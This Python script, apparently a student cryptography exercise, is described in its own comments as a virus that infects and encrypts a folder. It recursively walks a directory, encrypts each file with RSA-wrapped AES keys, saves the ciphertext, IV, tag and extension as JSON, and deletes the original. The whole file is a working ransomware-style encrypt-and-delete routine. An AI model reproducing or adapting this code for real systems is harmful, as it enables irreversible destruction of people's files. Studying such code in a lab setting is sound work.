# Import methods from other files 
from fileEncryptMAC import MyencryptMAC, MydecryptMAC, MyFileEncryptMAC, MyFileDecryptMAC
from fileEncryptRSA import generateKeyPair, MyRSAencrypt, MyRSAdecrypt
# Import needed cryptogrpahy 
import os
import json, base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, hmac, padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric.padding import OAEP, MGF1
from cryptography.hazmat.primitives.asymmetric.padding import MGF1 as uno
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.serialization import load_ssh_public_key
from pathlib import Path #used to get file ext
pub_key = "/Users/Phuc Nguyen/Desktop/FinalTesting/SHREKISLOVESHREKISLIFE555/publicKey.pem"

'''
Making a VIRUS that infect and encrypt a certain folder
'''
print("RSAEncrypt and RSADecrypt")
# This is the file where the virus will infect
# Making this path(tester folder) the current working directory 
dir_path = "/Users/Phuc Nguyen/Desktop/Testing"
os.chdir(dir_path)
cwd = os.getcwd()
#print("Current directory:" + cwd)

def infection():
    jason={}

    for root, dirs, files in os.walk(cwd):
        for filename in files:
            print("Encrypting " + filename + "...")
            # change directory to root in order to start from root and acess every folder inside the path
            os.chdir(root)
            #filename = os.path.join(root+filename)
            # Encryption method 
            RSACipher, C, IV, ext, tag = MyRSAencrypt(filename, pub_key )
            # getting rid of the extension (.jpg, ..)
            fname = os.path.splitext(str(filename))[0]
            #print(type(C))
            jas = {}   
            jas[fname] = []
            # Encoding using base 64 and decode with ascii 
            ascii_rsa = base64.b64encode(RSACipher).decode('ascii')
            ascii_C   = base64.b64encode(C).decode('ascii')
            ascii_tag = base64.b64encode(tag).decode('ascii')
            ascii_iv  = base64.b64encode(IV).decode('ascii')
            ascii_ext = ext
            # using dump to include all the ascii in it, later will be write to file
            jason = json.dumps({"RSACipher":ascii_rsa, "C":ascii_C, "tag":ascii_tag, "IV":ascii_iv, "ext":ascii_ext})
            jsonFile = fname + ".json"
            
            with open(jsonFile, 'w') as outfile: #Writes to json 
                #json.dump(jason, outfile)
                outfile.write(jason) # write the dumped dictionary to file 
                outfile.close()
            os.remove(filename) # remove all the file after encrypting it 
      

# testing
infection()
